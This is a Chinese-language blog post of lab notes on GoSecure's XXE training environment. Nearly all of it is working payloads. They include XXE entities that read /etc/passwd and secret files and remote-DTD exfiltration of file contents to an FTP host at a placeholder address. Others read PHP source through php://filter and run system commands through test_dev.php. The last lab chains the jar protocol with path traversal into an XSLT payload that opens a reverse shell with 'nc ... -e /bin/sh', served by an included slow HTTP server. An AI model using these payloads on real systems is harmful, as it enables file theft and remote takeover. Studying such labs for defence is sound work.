---
layout: post
title:  Learning XXE with gosecure
subtitle: Gosecure的XXE环境学习记录
tags: [xxe,websec]
---

## LAB 1: Basic XXE
`./gradlew build` 没有反应，修改版本
21_rssviewer_xxe/gradle/wrapper/gradle-wrapper.properties
```
distributionUrl=https\://services.gradle.org/distributions/gradle-4.8.1-all.zip
```
重新build即可。

读取`/etc/passwd`
```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<feed xmlns="http://www.w3.org/2005/Atom">
<generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator>
<link href="https://b.tcp.im/feed.xml" rel="self" type="application/atom+xml"/>
<link href="https://b.tcp.im/" rel="alternate" type="text/html"/>
<updated>2020-12-25T10:24:09+00:00</updated>
<id>https://b.tcp.im/feed.xml</id>
<title type="html">h4fan security</title>
<subtitle>web sec | bug bounty</subtitle>
<author>
<name>h4fan</name>
</author>
<entry>
<title type="html">Learning SSTI with gosecure</title>
<link href="https://b.tcp.im/2020/12/25/learning-ssti-with-gosecure.html" rel="alternate" type="text/html" title="Learning SSTI with gosecure"/>
<published>2020-12-25T00:00:00+00:00</published>
<updated>2020-12-25T00:00:00+00:00</updated>
<id>https://b.tcp.im/2020/12/25/learning-ssti-with-gosecure</id>
<content type="html" xml:base="https://b.tcp.im/2020/12/25/learning-ssti-with-gosecure.html">test &ent;</content>
<author>
<name>h4fan</name>
</author>
<category term="ssti"/>
<category term="websec"/>
</entry>
</feed>

```
当前环境可以列目录
```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///"> ]>

<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///secret/"> ]>


<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///secret/flag.txt"> ]>
```

## LAB 2: Exfiltration with remote DTD


```xml
<?xml version="1.0"?>
<!DOCTYPE data [ 
<!ENTITY % dtd SYSTEM "http://your_remote_Ip:port/ext.dtd"> 
%dtd;]>
<data>&send;</data>
```
ext.dtd
列目录
```xml
<?xml version="1.0" encoding="UTF-8"?>
 <!ENTITY % file SYSTEM "file:///secret/">
<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://your_remote_ftp_Ip:port/%file;'>"> %all;
```
查看文件
```xml
<?xml version="1.0" encoding="UTF-8"?>
 <!ENTITY % file SYSTEM "file:///secret/ijk/flag.txt">
<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://your_remote_ftp_Ip:port/%file;'>"> %all;
```
[xxe-ftp-server](https://raw.githubusercontent.com/ONsec-Lab/scripts/master/xxe-ftp-server.rb)
注释第50行`#puts "> 230 more data please!"`，方便显示。测试username和password都会报错，文件处可以。

## LAB 3: Filter encoding
读文件，但是无法列目录，不支持netloc
```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
```

```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=./.svn/wc.db"> ]>
```

```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=./test_dev.php"> ]>
```

```
/test_dev.php?func=system&val=id

/test_dev.php?func=system&val=cat%20/secret/flag_readme.txt
```

## LAB 4: Jar protocol
找密码admin:admin123456
```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
```
刚开始理解错了意思，是通过jar读远程文件，利用连接一直不断，文件会被放到/tmp目录，没有立即被删除，之后遍历/tmp目录，再利用“包含”。
```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "jar:http://your_remote_ip:port/!/test"> ]>
```
```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///tmp/"> ]>
```
```
template=../../../../../../../../tmp/jar_cache8917878752595665871.tmp
```
slow_http_server.py
```python
from tornado.ioloop import IOLoop 
import tornado.web
import time

class MainHandler(tornado.web.RequestHandler):
	def get(self):
		with open("malicious.xsl","r") as file:
			self.write(file.read())
			self.flush()
			time.sleep(99999)
			self.finish()


if __name__ == "__main__":
	application = tornado.web.Application([
		(r'/', MainHandler)])
	port = 9999
	application.listen(port)
	print("Listening on port "+str(port))
	IOLoop.instance().start()

```
malicious.xml
```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:date="http://xml.apache.org/xalan/java/java.util.Date"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
    exclude-result-prefixes="date">

  <xsl:output method="text"/>
  <xsl:template match="/">

   <xsl:variable name="cmd"><![CDATA[nc your_remote_ip port -e /bin/sh]]></xsl:variable>
   <xsl:variable name="rtObj" select="rt:getRuntime()"/>
   <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
   <xsl:text>Process: </xsl:text><xsl:value-of select="$process"/>

  </xsl:template>
</xsl:stylesheet>
```

## LAB 5: Exfiltration with local DTD
遍历文件关键词
```
The content of elements must consist of well-formed character data or markup
```
```xml
<!DOCTYPE svg [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
<!ENTITY % expr 'aaa)><!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;<!ELEMENT dummy(123 '>
    %local_dtd;
]>
```
```xml
<!DOCTYPE svg [
<!ENTITY % local_dtd SYSTEM "jar:file:///usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd">
<!ENTITY % Boolean '(true) #IMPLIED><!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;<!a  '>
    %local_dtd;
]>
```

* [Advanced XXE Exploitation](https://gosecure.github.io/xxe-workshop/#0)
* [xxe-injection-payload-list](https://github.com/payloadbox/xxe-injection-payload-list)
* [Automating local DTD discovery for XXE exploitation](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/)
